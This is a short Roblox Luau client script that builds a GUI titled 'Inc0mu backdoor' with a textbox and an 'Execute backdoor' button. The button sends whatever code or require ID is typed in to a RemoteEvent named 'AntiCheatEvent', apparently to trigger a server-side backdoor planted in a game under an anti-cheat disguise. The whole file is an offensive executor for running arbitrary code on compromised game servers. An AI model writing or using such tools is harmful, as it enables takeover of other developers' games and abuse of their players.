local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = frame

local label = Instance.new("TextLabel")
label.Size = UDim2.new(0, 280, 0, 30)
label.Position = UDim2.new(0, 10, 0, 160)
label.Text = "Inc0mu backdoor"
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
label.BorderSizePixel = 0
label.Parent = frame

local textbox = Instance.new("TextBox")
textbox.Size = UDim2.new(0, 280, 0, 50)
textbox.Position = UDim2.new(0, 10, 0, 10)
textbox.PlaceholderText = "backdoor holder"
textbox.Text = ""
textbox.TextWrapped = true
textbox.ClearTextOnFocus = false
textbox.Parent = frame

local button1 = Instance.new("TextButton")
button1.Size = UDim2.new(0, 130, 0, 50)
button1.Position = UDim2.new(0, 10, 0, 70)
button1.Text = "Execute backdoor"
button1.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
button1.BorderSizePixel = 0
button1.Parent = frame

local button2 = Instance.new("TextButton")
button2.Size = UDim2.new(0, 130, 0, 50)
button2.Position = UDim2.new(0, 150, 0, 70)
button2.Text = "Clear"
button2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button2.BorderSizePixel = 0
button2.Parent = frame

local button1Corner = Instance.new("UICorner")
button1Corner.CornerRadius = UDim.new(0, 10)
button1Corner.Parent = button1

local button2Corner = Instance.new("UICorner")
button2Corner.CornerRadius = UDim.new(0, 10)
button2Corner.Parent = button2

button1.MouseButton1Click:Connect(function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local AntiCheatEvent = ReplicatedStorage:WaitForChild("AntiCheatEvent")
    
    local function sendRequire()
        local requireCode = textbox.Text
        AntiCheatEvent:FireServer(requireCode)
    end
    
    sendRequire()
end)

button2.MouseButton1Click:Connect(function()
    textbox.Text = ""
end)
